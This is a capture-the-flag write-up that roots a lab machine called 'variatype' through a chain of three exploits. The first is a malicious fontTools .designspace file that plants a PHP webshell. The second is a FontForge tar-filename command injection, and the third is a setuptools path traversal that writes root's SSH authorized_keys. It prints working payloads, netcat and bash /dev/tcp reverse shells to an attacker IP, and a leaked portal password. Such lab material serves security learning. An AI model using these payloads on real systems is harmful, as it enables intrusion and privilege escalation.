```bash
============================================
  RECON SUMMARY
  Target:    10.129.244.202
  DNS:       variatype.htb
  Generated: 2026-05-01 08:08:30
============================================

--------------------------------------------
  INTERESTING PATHS
--------------------------------------------

  [ http://portal.variatype.htb ]
    200   /
    200   /styles.css
    301   /files/

  [ http://variatype.htb ]
    200   /
    200   /services
    200   /static/css/corporate.css
    200   /tools/variable-font-generator

--------------------------------------------
  SUBDOMAINS  (1 found)
--------------------------------------------
  portal.variatype.htb

--------------------------------------------
  OPEN PORTS & SERVICES
--------------------------------------------
  22/tcp     ssh            OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
  80/tcp     http           nginx 1.22.1

--------------------------------------------
  WEB PORTS
--------------------------------------------
  HTTP:   80
  HTTPS:  none

============================================
```

Ok so we have ssh and a website on port 80. pretty basic stuff. There was also a subdomain "portal" that was found via the automatic scan.

I visited the website to see whats going on.
The wbsite is a way to generate produciton-ready varaiable fonts. I have no idea what all of this means so Im going to do some research. 

https://nvd.nist.gov/vuln/detail/CVE-2025-66034

```bash
Description

fontTools is a library for manipulating fonts, written in Python. In versions from 4.33.0 to before 4.60.2, the fonttools varLib (or python3 -m fontTools.varLib) script has an arbitrary file write vulnerability that leads to remote code execution when a malicious .designspace file is processed. The vulnerability affects the main() code path of fontTools.varLib, used by the fonttools varLib CLI and any code that invokes fontTools.varLib.main(). This issue has been patched in version 4.60.2.
```

https://github.com/advisories/GHSA-768j-98cg-p3fv


```bash

<?xml version='1.0' encoding='UTF-8'?>
<designspace format="5.0">
        <axes>
        <!-- XML injection occurs in labelname elements with CDATA sections -->
            <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400">
                <labelname xml:lang="en"><![CDATA[<?php system($_REQUEST["cmd"]);?>]]]]><![CDATA[>]]></labelname>
                <labelname xml:lang="fr">MEOW2</labelname>
            </axis>
        </axes>
        <axis tag="wght" name="Weight" minimum="100" maximum="900" default="400"/>
        <sources>
                <source filename="source-light.ttf" name="Light">
                        <location>
                                <dimension name="Weight" xvalue="100"/>
                        </location>
                </source>
                <source filename="source-regular.ttf" name="Regular">
                        <location>
                                <dimension name="Weight" xvalue="400"/>
                        </location>
                </source>
        </sources>
        <variable-fonts>
                <variable-font name="MyFont" filename="/var/www/portal.variatype.htb/public/files/webshell.php">
                        <axis-subsets>
                                <axis-subset name="Weight"/>
                        </axis-subsets>
                </variable-font>
        </variable-fonts>
        <instances>
                <instance name="Display Thin" familyname="MyFont" stylename="Thin">
                        <location><dimension name="Weight" xvalue="100"/></location>
                        <labelname xml:lang="en">Display Thin</labelname>
                </instance>
        </instances>
</designspace>
```

We created our malicious .designspace file and placed it to the "/var/www/portal.variatype.htb/public/files/webshell.php"
Then we can visit it and execute commands and we can use it to get a reverse shell on the machine.

```bash
curl -s "http://portal.variatype.htb/files/webshell.php?cmd=cat%20/etc/passwd" | strings -10
TestWeight400root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
steve:x:1000:1000:steve,,,:/home/steve:/bin/bash
variatype:x:102:110::/nonexistent:/usr/sbin/nologin
_laurel:x:999:996::/var/log/laurel:/bin/false
```

We were able to get a revshell with the following
```bash
http://portal.variatype.htb/files/webshell.php?cmd=nc%20-c%20bash%2010.10.15.117%206666
```

Now we have to find a way to escalate our priviledges
I found credentials for the portal but i dont think they will be useful anymore

```bash
$USERS = [
    'gitbot' => 'G1tB0t_Acc3ss_2025!'
];
```

```bash
-rwxr-xr--  1 steve     steve     2018 Feb 26 07:50 process_client_submissions.bak
drwxr-xr-x  4 variatype variatype 4096 Mar  9 08:29 variatype
www-data@variatype:/opt$ cat proce      
cat process_client_submissions.bak 
#!/bin/bash
#
# Variatype Font Processing Pipeline
# Author: Steve Rodriguez <steve@variatype.htb>
# Only accepts filenames with letters, digits, dots, hyphens, and underscores.
#

set -euo pipefail

UPLOAD_DIR="/var/www/portal.variatype.htb/public/files"
PROCESSED_DIR="/home/steve/processed_fonts"
QUARANTINE_DIR="/home/steve/quarantine"
LOG_FILE="/home/steve/logs/font_pipeline.log"

mkdir -p "$PROCESSED_DIR" "$QUARANTINE_DIR" "$(dirname "$LOG_FILE")"

log() {
    echo "[$(date --iso-8601=seconds)] $*" >> "$LOG_FILE"
}

cd "$UPLOAD_DIR" || { log "ERROR: Failed to enter upload directory"; exit 1; }

shopt -s nullglob

EXTENSIONS=(
    "*.ttf" "*.otf" "*.woff" "*.woff2"
    "*.zip" "*.tar" "*.tar.gz"
    "*.sfd"
)

SAFE_NAME_REGEX='^[a-zA-Z0-9._-]+$'

found_any=0
for ext in "${EXTENSIONS[@]}"; do
    for file in $ext; do
        found_any=1
        [[ -f "$file" ]] || continue
        [[ -s "$file" ]] || { log "SKIP (empty): $file"; continue; }

        # Enforce strict naming policy
        if [[ ! "$file" =~ $SAFE_NAME_REGEX ]]; then
            log "QUARANTINE: Filename contains invalid characters: $file"
            mv "$file" "$QUARANTINE_DIR/" 2>/dev/null || true
            continue
        fi

        log "Processing submission: $file"

        if timeout 30 /usr/local/src/fontforge/build/bin/fontforge -lang=py -c "
import fontforge
import sys
try:
    font = fontforge.open('$file')
    family = getattr(font, 'familyname', 'Unknown')
    style = getattr(font, 'fontname', 'Default')
    print(f'INFO: Loaded {family} ({style})', file=sys.stderr)
    font.close()
except Exception as e:
    print(f'ERROR: Failed to process $file: {e}', file=sys.stderr)
    sys.exit(1)
"; then
            log "SUCCESS: Validated $file"
        else
            log "WARNING: FontForge reported issues with $file"
        fi

        mv "$file" "$PROCESSED_DIR/" 2>/dev/null || log "WARNING: Could not move $file"
    done
done

if [[ $found_any -eq 0 ]]; then
    log "No eligible submissions found."
fi
```

There was this file i found which is owned by steve. 

https://nvd.nist.gov/vuln/detail/CVE-2024-25082

```bash
Description

Splinefont in FontForge through 20230101 allows command injection via crafted archives or compressed files.
```
Let's exploit it to gain command execution as steve.

```bash
echo 'bash -i >& /dev/tcp/10.10.15.117/6666 0>&1' > /tmp/exp.sh    
www-data@variatype:~/portal.variatype.htb/public/files$ chmod +x /tmp/exp.sh
chmod +x /tmp/exp.sh
```
Then we create the malicious archive

```bash
www-data@variatype:~/portal.variatype.htb/public/files$ python3 << 'EOF'
import tarfile, io

malicious_name = "exploit.ttf;bash /tmp/exp.sh;"
tar = tarfile.open("exploit.tar", "w")
info = tarfile.TarInfo(name=malicious_name)
info.size = 4
tar.addfile(info, io.BytesIO(b"AAAA"))
tar.close()
print("done")
EOFpython3 << 'EOF'
> import tarfile, io
> 
> malicious_name = "exploit.ttf;bash /tmp/s.sh;"
> tar = tarfile.open("exploit.tar", "w")
> info = tarfile.TarInfo(name=malicious_name)
> info.size = 4
> tar.addfile(info, io.BytesIO(b"AAAA"))
> tar.close()
> print("done")
> 
EOF
```
And we wait for a bit and we have a shell.


```bash
nc -lvnp 6666    
listening on [any] 6666 ...
connect to [10.10.15.117] from (UNKNOWN) [10.129.44.229] 46840
bash: cannot set terminal process group (88901): Inappropriate ioctl for device
bash: no job control in this shell
steve@variatype:/tmp/ffarchive-88902-1$ id
id
uid=1000(steve) gid=1000(steve) groups=1000(steve)
```

```bash
steve@variatype:~$ sudo -l
sudo -l
Matching Defaults entries for steve on variatype:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *
```

Ok so the script downloads a plugin from a website that we provide and validates it. It doesn't execute it though. 

The setuptoolks package is vulnerable to path travelsal
And ive already tried it and it downloads what ever I want so we can just make it download a ssh key that we generated and place it to /root/.ssh and then just log in via ssh without having any passwords or such

https://nvd.nist.gov/vuln/detail/CVE-2025-47273
https://github.com/advisories/GHSA-5rjg-fvgr-3xxf

We have to create a malicious http.server first on the attacker machine. 
It works similar to "python3 -m http.server" but the differnce is that it ignores the requested URL path and always returns the same file.


```bash
sudo /usr/bin/python3 /opt/font-tools/install_validator.py http://10.10.15.117/%2froot%2f.ssh%2fauthorized_keys   
<ttp://10.10.15.117/%2froot%2f.ssh%2fauthorized_keys
2026-05-01 14:55:27,296 [INFO] Attempting to install plugin from: http://10.10.15.117/%2froot%2f.ssh%2fauthorized_keys
2026-05-01 14:55:27,303 [INFO] Downloading http://10.10.15.117/%2froot%2f.ssh%2fauthorized_keys
2026-05-01 14:55:27,370 [INFO] Plugin installed at: /root/.ssh/authorized_keys
[+] Plugin installed successfully.
```

So since there is path travelsal exploit we are able to give the path to the victims "/root/.ssh/authorized_keys" and our malicious http server always sends the ssh key we are able to make us login via ssh to the machine.

```bash
ssh root@10.129.44.229 -i id_rsa
Warning: Identity file id_rsa not accessible: No such file or directory.
Linux variatype 6.1.0-43-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.162-1 (2026-02-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri May 1 15:10:09 2026 from 10.10.15.117
root@variatype:~# id
uid=0(root) gid=0(root) groups=0(root)
```
The user.txt was pretty easy but the privesc was insanely difficult
